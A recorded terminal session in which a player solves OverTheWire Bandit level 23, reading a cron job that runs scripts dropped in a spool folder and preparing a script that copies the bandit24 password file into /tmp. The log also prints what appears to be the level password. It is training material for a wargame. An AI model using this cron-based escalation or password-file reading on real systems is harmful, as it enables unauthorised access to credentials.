@@ -1,0 +1,225 @@
+Script started on 2019-03-02 21:32:34+0530
+]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ cat Documents/bannditLevelsTypescript/bandit21[A]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ echo "I am user b[11Pandit22" | md5sum[A]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ [Cxit[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cssh -p 2220 bandiit22@bandit.labs.overthewire.org[A]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ cat Documents/ban[3PditLevelsTypescript/bandit21[A]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ ssh -p 2220 bandit22@bandit.labs.overthewire.org[1P@bandit.labs.overthewire.org[C[C[C3@bandit.labs.overthewire.org[C[C[C[C
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit23@bandit.labs.overthewire.org's password: 
+Linux bandit 4.18.12 x86_64 GNU/Linux
+               
+      ,----..            ,----,          .---. 
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' ' 
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      : 
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ; 
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"  
+     \   \ .'        ;   |.'       \   \ ;     
+  www. `---` ver     '---' he       '---" ire.org     
+               
+              
+Welcome to OverTheWire!
+
+If you find any problems, please report them to Steven or morla on
+irc.overthewire.org.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames. 
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
+  so that users can not snoop on eachother. Files and directories with 
+  easily guessable or short names will be periodically deleted!
+	
+  Please play nice:
+      
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS! 
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro 
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few usefull tools which you can find
+ in the following locations:
+
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
+    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us through IRC on
+  irc.overthewire.org #wargames.
+
+  Enjoy your stay!
+
+]0;bandit23@bandit: ~[01;32mbandit23@bandit[00m:[01;34m~[00m$ [H[2J]0;bandit23@bandit: ~[01;32mbandit23@bandit[00m:[01;34m~[00m$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+]0;bandit23@bandit: ~[01;32mbandit23@bandit[00m:[01;34m~[00m$ cat  /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+
+]0;bandit23@bandit: ~[01;32mbandit23@bandit[00m:[01;34m~[00m$ cd /tmp/bandit24
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ ls
+bandit24  bandit.sh  pass  [0m[01;34mtemp[0m
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ ls temp/
+pass.sh
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat > bandit[K[K[K[K[K[Ktemp/pass.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+
+
+
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat /ust[Kr/bin/s[Kcron
+cronjob_bandit22.sh  cronjob_bandit24.sh  
+cronjob_bandit23.sh  crontab              
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat /usr/bin/cronjob_bandit22[K3.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat /usr/bin/cronjob_bandit23.sh > bandit.sh 
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat bandit.sh 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat pass 
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ rm pass 
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ vim bandit.sh 
+[?1000h[?1049h[?1h=[2;1H▽[6n[2;1H  [1;1H]11;?[1;24r[?12;25h[?12l[?25h[27m[23m[m[H[2J[?25l[24;1H"bandit.sh" 8L, 211C[>c[1;1H[34m#!/bin/bash[m
+
+[36mmyname[m=[35m$([m[35mwhoami[m[35m)[m
+[36mmytarget[m=[35m$([m[38;5;130mecho[m[31m I am user [m[35m$myname[m[31m [m[38;5;130m|[m[35m md5sum [m[38;5;130m|[m[35m cut -d [m[38;5;130m'[m[31m [m[38;5;130m'[m[35m -f [m[31m1[m[35m)[m
+
+[38;5;130mecho[m[31m [m[38;5;130m"[m[31mCopying passwordfile /etc/bandit_pass/[m[35m$myname[m[31m to /tmp/[m[35m$mytarget[m[38;5;130m"[m
+
+cat /etc/bandit_pass/[35m$myname[m [38;5;130m>[m /tmp/[35m$mytarget[m
+[94m~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [m[24;63H1,1[11CAll[1;1H[?12l[?25h[27m[23m[m[H[2J[?25l[1;1H[96m#!/bin/bash[m
+
+[1m[96mmyname[m=[38;5;81m$([m[38;5;224mwhoami[m[38;5;81m)[m
+[1m[96mmytarget[m=[38;5;81m$([m[93mecho[m[95m I am user [m[38;5;81m$myname[m[95m [m[93m|[m[38;5;224m md5sum [m[93m|[m[38;5;224m cut -d [m[93m'[m[95m [m[93m'[m[38;5;224m -f [m[95m1[m[38;5;81m)[m
+
+[93mecho[m[95m [m[93m"[m[95mCopying passwordfile /etc/bandit_pass/[m[38;5;81m$myname[m[95m to /tmp/[m[38;5;81m$mytarget[m[93m"[m
+
+cat /etc/bandit_pass/[38;5;81m$myname[m [93m>[m /tmp/[38;5;81m$mytarget[m
+[94m~                                                                               [10;1H~                                                                               [11;1H~                                                                               [12;1H~                                                                               [13;1H~                                                                               [14;1H~                                                                               [15;1H~                                                                               [16;1H~                                                                               [17;1H~                                                                               [18;1H~                                                                               [19;1H~                                                                               [20;1H~                                                                               [21;1H~                                                                               [22;1H~                                                                               [23;1H~                                                                               [m[24;63H1,1[11CAll"bandit.sh" 8L, 211C[1;1H[?12l[?25h[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?25l[24;53H~@k[1;1H[24;53H   [2;1H[24;63H2,0-1[2;1H[?12l[?25h[?25l[24;53H~@k[2;1H[24;53H   [3;1H[24;63H3,1  [3;1H[?12l[?25h[?25l[24;53H~@k[3;1H[24;53H   [3;2H[24;65H2[3;2H[?12l[?25h[?25l[24;53H~@k[3;2H[24;53H   [3;3H[24;65H3[3;3H[?12l[?25h[?25l[24;53H~@k[3;3H[24;53H   [3;4H[24;65H4[3;4H[?12l[?25h[?25l[24;53H~@k[3;4H[24;53H   [3;5H[24;65H5[3;5H[?12l[?25h[?25l[24;53H~@k[3;5H[24;53H   [3;6H[24;65H6[3;6H[?12l[?25h[?25l[24;53H~@k[3;6H[24;53H   [3;7H[24;65H7[3;7H[?12l[?25h[?25l[24;53H~@k[3;7H[24;53H   [3;8H[24;65H8[3;8H[?12l[?25h[?25l[24;53H~@k[3;8H[24;53H   [3;9H[38;5;81m[46m([6C)[m[24;65H9[3;9H[?12l[?25h[?25l[24;53H~@k[3;9H[24;53H   [3;10H[38;5;81m([6C)[m[24;65H10[3;10H[?12l[?25h[?25l[24;53H~@k[3;10H[24;53H   [3;11H[24;66H1[3;11H[?12l[?25h[?25l[24;53H~@k[3;11H[24;53H   [3;12H[24;66H2[3;12H[?12l[?25h[?25l[24;53H~@k[3;12H[24;53H   [3;13H[24;66H3[3;13H[?12l[?25h[?25l[24;53H~@k[3;13H[24;53H   [3;14H[24;66H4[3;14H[?12l[?25h[?25l[24;53H~@k[3;14H[24;53H   [3;15H[24;66H5[3;15H[?12l[?25h[?25l[24;53H~@k[3;15H[24;53H   [3;16H[3;9H[38;5;81m[46m([6C)[m[24;66H6[3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53H~@k[3;16H[24;53H   [3;16H[?12l[?25h[?25l[24;53Hi[3;16H[24;53H [3;16H[24;1H[1m-- INSERT --[m[24;13H[K[24;63H3,16[10CAll[3;16H[?12l[?25h[?25l[38;5;81m)[m[3;16H[K[3;15H[38;5;81m[46m)[m[24;66H5[3;15H[?12l[?25h[?25l[38;5;81m)[m[3;15H[K[3;14H[38;5;81m[46m)[m[24;66H4[3;14H[?12l[?25h[?25l[38;5;81m)[m[3;14H[K[3;13H[38;5;81m[46m)[m[24;66H3[3;13H[?12l[?25h[?25l[38;5;81m)[m[3;13H[K[3;12H[38;5;81m[46m)[m[24;66H2[3;12H[?12l[?25h[?25l[38;5;81m)[m[3;12H[K[3;11H[38;5;81m[46m)[m[24;66H1[3;11H[?12l[?25h[?25l[38;5;81m)[m[3;11H[K[3;10H[38;5;81m[46m)[m[24;66H0[3;10H[?12l[?25h[?25l$[97m[46m)[m[3;10H[K[3;9H[97m[101m)[m[24;65H9 [3;9H[?12l[?25h[?25l[97m[101m)[m[3;9H[K[24;65H8[3;8H[?12l[?25h[?25l[24;65H9[3;9H[?12l[?25h[?25l[3;8H[K[24;65H8[3;8H[?12l[?25h[?25l[93m"[m
+[95mmytarget=
+
+echo[m[2CCopying passwordfile /etc/bandit_pass/[7C to /tmp/
+
+[95mcat /etc/bandit_pass/[7C > /tmp/[m[24;65H9[3;9H[?12l[?25h[?25l[95mb[m[24;65H10[3;10H[?12l[?25h[?25l[95ma[m[24;66H1[3;11H[?12l[?25h[?25l[95mn[m[24;66H2[3;12H[?12l[?25h[?25l[95md[m[24;66H3[3;13H[?12l[?25h[?25l[95mi[m[24;66H4[3;14H[?12l[?25h[?25l[95mt[m[24;66H5[3;15H[?12l[?25h[?25l[95m2[m[24;66H6[3;16H[?12l[?25h[?25l[95m4[m[24;66H7[3;17H[?12l[?25h[?25l[93m"[m
+[1m[96mmytarget[m=
+
+[93mecho[m[2C[95mCopying passwordfile /etc/bandit_pass/[7C to /tmp/[m
+
+cat /etc/bandit_pass/[7C [93m>[m /tmp/[24;66H8[3;18H[?12l[?25h[24;1H[K[3;17H[?25l[24;53H^[[3;17H[24;53H  [3;18H[24;63H3,17[10CAll[3;17H[?12l[?25h[?25l[24;53H:[3;17H[24;53H[K[24;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l[?1006l[?1002l"bandit.sh" 8L, 212C written
+[97m[41mE138: Can't write viminfo file /home/bandit23/.viminfo![m
+[38;5;121mPress ENTER or type command to continue[?12l[?25h
+
+[m[?1l>[?1049l]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat bandit.sh 
+#!/bin/bash
+
+myname="bandit24"
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat 
+bandit24   bandit.sh  temp/      
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cat bandit24 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ rm[K[Kbash bandit.sh 
+Copying passwordfile /etc/bandit_pass/bandit24 to /tmp/ee4ee1703b083edac9f8183e4ae70293
+bandit.sh: line 8: /tmp/ee4ee1703b083edac9f8183e4ae70293: Permission denied
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ cp /tmp/ee4ee1703b083edac9f8183e4ae70293 bandit24  [A]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1@c[1@a[1@t
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+]0;bandit23@bandit: /tmp/bandit24[01;32mbandit23@bandit[00m:[01;34m/tmp/bandit24[00m$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
+]0;am4n@am4n-HP-ProBook-450-G4: ~/Documents/banditLevelsTypescript[01;32mam4n@am4n-HP-ProBook-450-G4[00m:[01;34m~/Documents/banditLevelsTypescript[00m$ exit
+exit
+
+Script done on 2019-03-02 21:36:34+0530
